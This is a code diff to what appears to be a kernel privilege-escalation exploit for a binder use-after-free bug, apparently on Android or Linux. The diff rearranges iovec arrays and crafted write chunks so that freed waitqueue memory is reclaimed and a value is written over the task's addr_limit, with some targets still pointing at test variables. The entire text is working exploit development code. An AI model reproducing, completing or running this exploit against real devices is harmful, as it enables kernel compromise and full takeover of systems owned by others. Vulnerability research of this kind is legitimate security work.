@@ -168,8 +168,6 @@ void clobber_addr_limit(void)
   char* uafFill = malloc(UAF_SPINLOCK);
   if (uafFill == NULL) err(1, "allocating uafFill");
   memset(uafFill, 0xC4, UAF_SPINLOCK);
-  char testFill[6*8]; // 600-WAITQUEUE_OFFSET-16];
-  for (int i=0;i<sizeof(testFill);i++) testFill[i]=i;
     
   struct epoll_event event = { .events = EPOLLIN };
   if (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &event)) err(1, "epoll_add");
@@ -181,36 +179,36 @@ void clobber_addr_limit(void)
   
   printf("current_ptr = %lx\n", current_ptr);
   
-  unsigned long second_write_chunk[] = {
+#define SECOND_WRITE_CHUNK_IOVEC_ITEMS 3
+  
+  unsigned long second_write_chunk[SECOND_WRITE_CHUNK_IOVEC_ITEMS*2] = {
     (unsigned long)dataBuffer, /* iov_base (currently in use) */   // wq->task_list->next
-    sizeof(testFill), /* iov_len (currently in use) */  // wq->task_list->prev
+    SECOND_WRITE_CHUNK_IOVEC_ITEMS * 0x10, /* iov_len (currently in use) */  // wq->task_list->prev
+    
     &testDatum2, //(unsigned long)current_ptr+0x8, // current_ptr+0x8, // current_ptr + 0x8, /* next iov_base (addr_limit) */
     8, /* next iov_len (sizeof(addr_limit)) */
+    
     &testDatum, //&testDatum, // current_ptr+0x8, // current_ptr + 0x8, /* next iov_base (addr_limit) */
     8, /* next iov_len (sizeof(addr_limit)) */
   };
-  memcpy(testFill, second_write_chunk, sizeof(second_write_chunk));
   
-  printf("offset %lx %lx\n", sizeof(testFill), sizeof(second_write_chunk));
   unsigned long third_write_chunk[] = {
     0xABCDEF0123456789, /* value to write over addr_limit */
     0xfffffffffffffffe, /* value to write over addr_limit */
   };
   
-  int initialSize = 4096*17 - UAF_SPINLOCK-sizeof(testFill);
+  int initialSize = 4096*17 - UAF_SPINLOCK-sizeof(second_write_chunk);
 
-//  iovec_array[IOVEC_INDX_FOR_WQ-2].iov_base = &testDatum;
-//  iovec_array[IOVEC_INDX_FOR_WQ-2].iov_len = 8; 
   iovec_array[IOVEC_INDX_FOR_WQ-1].iov_base = dataBuffer;
   iovec_array[IOVEC_INDX_FOR_WQ-1].iov_len = initialSize; 
   iovec_array[IOVEC_INDX_FOR_WQ].iov_base = dataBuffer;
   iovec_array[IOVEC_INDX_FOR_WQ].iov_len = 0; // spinlock: will turn to UAF_SPINLOCK
-  iovec_array[IOVEC_INDX_FOR_WQ+1].iov_base = testFill; // wq->task_list->next: will turn to address of task_list
-  iovec_array[IOVEC_INDX_FOR_WQ+1].iov_len = sizeof(testFill); // wq->task_list->prev: will turn to address of task_list
-//  iovec_array[IOVEC_INDX_FOR_WQ+2].iov_base = dataBuffer; // dataBuffer;
-//  iovec_array[IOVEC_INDX_FOR_WQ+2].iov_len = sizeof(third_write_chunk); 
-  iovec_array[IOVEC_INDX_FOR_WQ+3].iov_base = dataBuffer;
-  iovec_array[IOVEC_INDX_FOR_WQ+3].iov_len = UAF_SPINLOCK+sizeof(third_write_chunk);
+  iovec_array[IOVEC_INDX_FOR_WQ+1].iov_base = second_write_chunk; // wq->task_list->next: will turn to address of task_list
+  iovec_array[IOVEC_INDX_FOR_WQ+1].iov_len = sizeof(second_write_chunk); // wq->task_list->prev: will turn to address of task_list
+  iovec_array[IOVEC_INDX_FOR_WQ+2].iov_base = dataBuffer; // stuff from this point will be overwritten and/or ignored
+  iovec_array[IOVEC_INDX_FOR_WQ+2].iov_len = UAF_SPINLOCK;
+  iovec_array[IOVEC_INDX_FOR_WQ+4].iov_base = dataBuffer;
+  iovec_array[IOVEC_INDX_FOR_WQ+4].iov_len = sizeof(third_write_chunk);
   int totalLength = iovec_size(iovec_array, IOVEC_ARRAY_SZ);
  
   int socks[2];
@@ -233,9 +231,9 @@ void clobber_addr_limit(void)
     memcpy(f,uafFill,initialSize);
     memcpy(f+initialSize,uafFill,UAF_SPINLOCK);
     memcpy(f+initialSize+UAF_SPINLOCK,second_write_chunk,sizeof(second_write_chunk));
-    memcpy(f+initialSize+UAF_SPINLOCK+sizeof(testFill),third_write_chunk,sizeof(third_write_chunk));
-    write(socks[1], f, initialSize+UAF_SPINLOCK+sizeof(testFill)+sizeof(third_write_chunk));
-    printf("CHILD: wrote %lu\n", initialSize+UAF_SPINLOCK+sizeof(testFill)+sizeof(third_write_chunk));
+    memcpy(f+initialSize+UAF_SPINLOCK+sizeof(second_write_chunk),third_write_chunk,sizeof(third_write_chunk));
+    write(socks[1], f, initialSize+UAF_SPINLOCK+sizeof(second_write_chunk)+sizeof(third_write_chunk));
+    printf("CHILD: wrote %lu\n", initialSize+UAF_SPINLOCK+sizeof(second_write_chunk)+sizeof(third_write_chunk));
     close(socks[1]);
     close(socks[0]);
     exit(0);
@@ -328,8 +326,6 @@ int main(int argc, char** argv) {
       printf("current_ptr = %lx\n", (unsigned long)current_ptr);
       printf("Clobbering addr_limit\n");
       clobber_addr_limit();
-      leak_data(leaked, leakSize);
-      hexdump_memory(leaked, leakSize);
   }
   free(leaked);
   
